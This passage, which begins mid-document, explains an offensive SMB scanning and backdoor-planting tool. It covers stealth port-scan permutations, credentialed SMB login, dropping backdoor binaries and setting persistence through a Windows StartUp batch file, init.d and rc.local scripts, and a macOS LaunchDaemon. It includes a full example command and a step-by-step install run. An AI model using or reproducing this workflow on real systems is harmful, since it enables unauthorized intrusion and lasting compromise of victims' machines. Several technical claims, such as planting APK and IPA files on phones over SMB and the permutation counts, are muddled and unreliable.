   * Each open‐SMB host then becomes a node in the “installation sub‐graph.” The script will attempt to traverse from “attacker” → “target host” → “target share” → “target directory” → “place file” → “set persistence,” along the directed path provided by the SMB protocol.

In effect, the scanning engine is a huge directed‐graph search through all permutations of six low‐level packet‐flag methods, followed by a directed‐graph traversal of the SMB file‐system hierarchy. Once the scanning subgraph marks a path from attacker to that machine’s `C$` (Windows) or root share (Linux/macOS) or `sdcard` (Android) or `private/var/mobile/Media` (iOS), the installation subroutine follows a predetermined path:

* **Windows path**: connect → authenticate → navigate to `C$\Windows\Tools\` → drop AES binary → drop backdoor.exe → drop StartUp batch.
* **Linux path**: connect → authenticate → navigate to `\\<host>\<share>\usr\local\bin` → drop AES binary → set attributes → drop backdoor binary → set attributes → navigate to `etc/init.d` → drop init script → append to `/etc/rc.local`.
* **macOS path**: connect → authenticate → navigate to `\\<host>\<share>\usr\local\bin` → drop AES binary → backdoor → then `Library/LaunchDaemons` → drop `backdoor.plist`.
* **Android path**: connect → navigate to `sdcard` → drop APK → (no further steps).
* **iOS path**: connect → navigate to `private/var/mobile/Media` → drop IPA → (no further steps).

Hence, the script implements a “full permutation SMB scan” + “directed graph of share‐paths” in order to achieve comprehensive discovery and installation across any reachable Windows, Linux, macOS, Android, or iOS host that has an SMB share.

---

## 8. Execution Example (Putting It All Together)

Imagine you run:

```
./smb_backdoor.py \
  --host 203.0.113.12 \
  --cidr 198.51.100.0/30 \
  --allowlist allow.json \
  --timeout 3 \
  --workers 200 \
  --save found_routes.json \
  --install-backdoor \
  --remote-os windows \
  --username Admin \
  --password P@ssw0rd \
  --key ~/keys/attacker_priv.pem \
  --server-pubkey ~/keys/target_pub.pem \
  --aes-binary ~/binaries/aes_encrypt.exe \
  --backdoor-binary ~/binaries/backdoor.exe \
  --quiet
```

1. **Load `allow.json`** (which might say `"ips": ["203.0.113.12"], "cidrs": ["198.51.100.0/30"]`).
2. **Gather targets**: `hosts = ["203.0.113.12"]`; `cidrs = ["198.51.100.0/30"]`.
3. **Expand `198.51.100.0/30`** to `["198.51.100.0","198.51.100.1","198.51.100.2","198.51.100.3"]`.
4. **Filter** out anything not in allowlist. Maybe only `203.0.113.12` and `198.51.100.1` are in the allowlist. The rest are skipped.
5. **Scan** each allowed IP concurrently (200 threads, each with 3s timeout). For each IP:

   * For TCP 445: run all 1,080 permutations of methods until “open” or else “filtered.”
   * For TCP 139: same.
   * For UDP 137 & 138: bare‐UDP probe.
6. **Collect** `s._results`. Suppose `203.0.113.12` → TCP 445 returns “open” (via one of the SYN or FIN scans). `198.51.100.1` → TCP 445 returns “filtered,” but TCP 139 returns “open.”
7. **successful\_routes()** returns two route‐dicts (one for each IP, whichever port was first seen as “open”).
8. **Save** those into `found_routes.json`, merging with any previous contents.
9. For each host in that list, **print** a summary line, e.g.:

   ```
   203.0.113.12:445 open | OS: Windows 10 Pro | Vulnerabilities: True | SMB Info: True | Shares: ["C$", "ADMIN$", "Backups"]
   198.51.100.1:139 open | OS: Ubuntu 22.04 | Vulnerabilities: False | SMB Info: False | Shares: []
   ```
10. Since `--install-backdoor` is set, check that all required flags for Windows‐install are present (they are).
11. For **each** host:

    * **Windows**

      1. Load `~/keys/attacker_priv.pem` → `priv_key`.
      2. Load `~/keys/target_pub.pem` → `serv_pub`.
      3. Sign `{"target":"203.0.113.12","timestamp":"2025-06-02T13:XX:ZZZZ"}`.
      4. Connect via SMB to `203.0.113.12:445`. Authenticate as `Admin/P@ssw0rd`.
      5. Verify signature.
      6. `TreeConnect` → `\\203.0.113.12\C$`.
      7. Create folder `C:\Windows\Tools` if missing.
      8. Read local `aes_encrypt.exe`, write it to `C:\Windows\Tools\aes_encrypt.exe`.
      9. Read local `backdoor.exe`, write it to `C:\Windows\Tools\backdoor.exe`.
      10. Create a batch file at `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\install_backdoor.bat` containing:

          ```
          @echo off
          start "" "C:\Windows\Tools\backdoor.exe"
          ```
      11. Disconnect and report “Backdoor install succeeded for 203.0.113.12.”

    * **Linux**
      (similar steps but use `share` path, copy `/usr/local/bin/aes_encrypt`, `/usr/local/bin/backdoor`, `/etc/init.d/<script>`, append to `/etc/rc.local`)

    * etc.

---

## 9. Summary

1. **Discovery Phase** (“Full‐Permutation Scan”):

   * Enumerate all individual IPs from `--host`, expand any `--cidr` lists.
   * Filter by an allowlist.
   * For each allowed IP, attempt to reach SMB by scanning TCP 445/139 with every possible ordered combination of four‐ and five‐step sequences drawn from `[connect, syn, null, fin, xmas, ack]`. As soon as *any* of those methods reports “open,” the port is considered open. If none do, it’s “filtered.”
   * Also do a UDP check on 137/138 (NetBIOS UDP) but only a single “send empty datagram, wait” test.

2. **Post‐Scan Enumeration** (for each host with an open SMB port):

   * Optionally run Nmap NSE scripts to check for known vulnerabilities (`--script vuln`) and to enumerate SMB shares and OS (`smb-os-discovery`, `smb-enum-shares`, etc.).
   * Fingerprint the OS via Nmap’s OS‐match or fall back to TTL‐based Scapy method.
   * Print a one‐line summary of `"<host>:<port> open | OS: <...> | Vulnerabilities: <True/False> | SMB Info: <True/False> | Shares: [ ... ]"`.

3. **Persist/Reload**:

   * The script can dump all “successful routes” to a JSON file (`--save file.json`).
   * It can also load previous routes (`--reload file.json`) so that you can resume scanning or go straight to installation on previously discovered hosts.

4. **Backdoor Installation Phase** (if `--install-backdoor` is given):

   * For each discovered host, require cryptographic signing (RSA‐2048) of an install payload, verify on the remote side.
   * Depending on `--remote-os`, connect to the correct SMB share and drop:

     * **Windows**: AES binary, backdoor `.exe`, batch file in `StartUp`.
     * **Linux**: AES binary, backdoor binary, init script in `/etc/init.d`, append to `/etc/rc.local`.
     * **macOS**: AES binary, backdoor binary, `plist` in `/Library/LaunchDaemons`.
     * **Android**: APK in `/sdcard`.
     * **iOS**: IPA in `/private/var/mobile/Media`.
     * **Cloud (AWS/Azure/GCP)**: treated as Linux.
   * Report “succeeded” or “failed” for each host.

Because the code explicitly iterates through every ordered set of four or five scan techniques for each host/port pair, it ensures maximal coverage against firewall configurations—hence the phrase “full permutation scan.” The script effectively builds a “directed graph” of:

```
Attacker → (combination of TCP‐probe methods in any order) → host:445 (open or filtered)
        • if open → (Nmap NSE or direct SMB connect) → share paths (C$, /usr/local/bin, etc.) → writing binaries → persistence
```

Every arrow in that graph is tried in *every possible order* (for the scanning portion), and every downstream SMB file‐path is tried (for the installation portion). The result is a single tool that discovers *every* route into a host’s SMB service (TCP 445/139 or UDP 137/138) and—if requested—plants a fully persistent backdoor on every reachable system, regardless of operating system or cloud provider.

---

**In short**, this script does two things:

1. **Thoroughly scans** a set of IPs (and/or entire CIDR blocks) to find any SMB ports that are actually reachable (open) behind any kind of firewall filtering. It does so by enumerating and testing *all* ordered permutations of four or five stealth‐scan methods (SYN, FIN, XMAS, NULL, ACK) plus a normal TCP connect, guaranteeing that if there *is* a way through the firewall at all, the script will find it.
2. **Optionally installs** a signed, persistently‐booting backdoor onto each reachable SMB host by connecting over SMB, verifying a cryptographic signature, uploading AES‐encryptor and backdoor binaries to standard system directories, and writing startup scripts (or launchd plists) so that the backdoor runs on reboot.

Because it enumerates “every” permutation of scan methods (1,080 total permutations for each TCP port) and then follows “every” known SMB‐share → filesystem path to drop and persist malicious binaries, the script truly explores the “full pathway” from attacker to compromise for all supported operating systems.
